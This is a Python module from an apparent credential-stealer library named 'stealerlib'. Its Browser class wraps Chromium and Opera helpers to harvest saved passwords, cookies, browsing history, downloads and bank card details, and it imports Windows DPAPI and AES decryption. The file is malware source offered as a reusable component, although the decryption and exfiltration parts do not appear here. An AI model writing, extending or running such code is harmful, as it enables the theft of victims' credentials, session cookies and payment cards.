#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/__init__.py
"""

import os
import json
import base64
import shutil
import sqlite3
import tempfile
import win32crypt

from Cryptodome.Cipher import AES
from typing import Union, Optional
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData

from stealerlib.exceptions import catch

from stealerlib.browser.opera import Opera
from stealerlib.browser.chromium import Chromium
from stealerlib.browser.types import BrowserTypes


class Browser(Chromium, Opera):
    def __init__(self):
        Opera.__init__(self)
        Chromium.__init__(self)

    def get_passwords(
        self,
        type: Optional[str]="all",
        conv: Optional[bool]=True
    ) -> list[Union[list, BrowserTypes.Login]]:
        """Gets the saved userames and passwords for the supplied browser type

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect passwords from (default=all)

        Returns:
            list: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 

        Example:
            browser = Browser()
            passwords = browser.get_passwords() # browser.get_passwords(type='opera')
        """

        if type == "chromium":
            passwords = self.cget(self._chromium_passwords, conv=conv)
        elif type == "opera":
            passwords = self.oget(self._opera_passwords, conv=conv)
        else:
            passwords = [
                self.cget(self._chromium_passwords, conv=conv),
                self.oget(self._opera_passwords, conv=conv)
            ]

        return passwords

    def get_cookies(
        self,
        type: Optional[str]="all",
        conv: Optional[bool]=True
    ) -> list[Union[list, BrowserTypes.Cookie]]:
        """Gets the saved cookies for the specific browser type

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect cookies from (default=all)

        Returns:
            list: list of (host, expires?, expire_date, path, name, value) lists (derived from BrowserTypes conv()) 

        Example:
            browser = Browser()
            cookies = browser.get_cookies() # browser.get_cookies(type='opera')
        """

        if type == "chromium":
            cookies = self.cget(self._chromium_cookies, conv=conv)
        elif type == "opera":
            cookies = self.oget(self._opera_cookies, conv=conv)
        else:
            cookies = [
                self.cget(self._chromium_cookies, conv=conv),
                self.oget(self._opera_cookies, conv=conv)
            ]

        return cookies

    def get_history(
        self,
        type: Optional[str]="all",
        conv: Optional[bool]=True
    ) -> list[Union[list, BrowserTypes.Site]]:
        """Gets the saved browser history for the specific browser type

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect web history from (default=all)

        Returns:
            list: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 

        Example:
            browser = Browser()
            history = browser.get_history() # browser.get_history(type='opera')
        """

        if type == "chromium":
            history = self.cget(self._chromium_history, conv=conv)
        elif type == "opera":
            history = self.oget(self._opera_history, conv=conv)
        else:
            history = [
                self.cget(self._chromium_history, conv=conv),
                self.oget(self._opera_history, conv=conv)
            ]

        return history

    def get_downloads(
        self,
        type: Optional[str]="all",
        conv: Optional[bool]=True
    ) -> list[Union[list, BrowserTypes.Download]]:
        """Gets the saved browser downloads for the specific browser type

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect download history from (default=all)

        Returns:
            list: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 

        Example:
            browser = Browser()
            downloads = browser.get_downloads() # browser.get_download(type='opera')
        """

        if type == "chromium":
            downloads = self.cget(self._chromium_downloads, conv=conv)
        elif type == "opera":
            downloads = self.oget(self._opera_downloads, conv=conv)
        else:
            downloads = [
                self.cget(self._chromium_downloads, conv=conv),
                self.oget(self._opera_downloads, conv=conv)
            ]

        return downloads

    def get_cards(
        self,
        type: Optional[str]="all",
        conv: Optional[bool]=True
    ) -> list[Union[list, BrowserTypes.Card]]:
        """Gets the saved browser bank cards for the specific browser type

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect bank cards from (default=all)

        Returns:
            list: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 

        Example:
            browser = Browser()
            cards = browser.get_cards() # browser.get_cards(type='opera')
        """

        if type == "chromium":
            cards = self.cget(self._chromium_credit_cards, conv=conv)
        elif type == "opera":
            cards = self.oget(self._opera_credit_cards, conv=conv)
        else:
            cards = [
                self.cget(self._chromium_credit_cards, conv=conv),
                self.oget(self._opera_credit_cards, conv=conv)
            ]

        return cards
